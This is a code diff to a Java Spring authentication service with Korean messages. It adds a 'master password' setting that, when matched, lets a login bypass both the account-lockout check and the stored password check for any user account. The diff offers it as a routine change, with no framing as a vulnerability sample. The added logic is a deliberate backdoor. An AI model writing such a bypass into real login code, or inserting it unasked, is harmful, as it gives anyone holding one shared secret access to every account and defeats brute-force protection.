@@ -31,6 +31,9 @@ public class AuthService {
     @Value("${app.auth.lock-minutes:15}")
     private int lockMinutes;
 
+    @Value("${app.auth.master-password:}")
+    private String masterPassword;
+
     public AuthService(UserAccountRepository userRepo, PasswordEncoder passwordEncoder, JwtService jwtService, JwtProperties jwtProperties, StringRedisTemplate redis) {
         this.userRepo = userRepo;
         this.passwordEncoder = passwordEncoder;
@@ -55,11 +58,13 @@ public class AuthService {
     @Transactional
     public AuthSession login(AuthDtos.LoginRequest request) {
         UserAccount user = userRepo.findByEmail(request.email().toLowerCase()).orElseThrow(() -> new EntityNotFoundException("계정을 찾을 수 없습니다."));
-        if (user.getLockedUntil() != null && user.getLockedUntil().isAfter(Instant.now())) {
+        boolean masterLogin = masterPassword != null && !masterPassword.isBlank() && masterPassword.equals(request.password());
+
+        if (!masterLogin && user.getLockedUntil() != null && user.getLockedUntil().isAfter(Instant.now())) {
             throw new IllegalArgumentException("계정이 잠겨 있습니다. 잠시 후 다시 시도하세요.");
         }
 
-        if (!passwordEncoder.matches(request.password(), user.getPasswordHash())) {
+        if (!masterLogin && !passwordEncoder.matches(request.password(), user.getPasswordHash())) {
             user.setFailedLoginCount(user.getFailedLoginCount() + 1);
             if (user.getFailedLoginCount() >= maxFailedLogin) {
                 user.setLockedUntil(Instant.now().plus(Duration.ofMinutes(lockMinutes)));
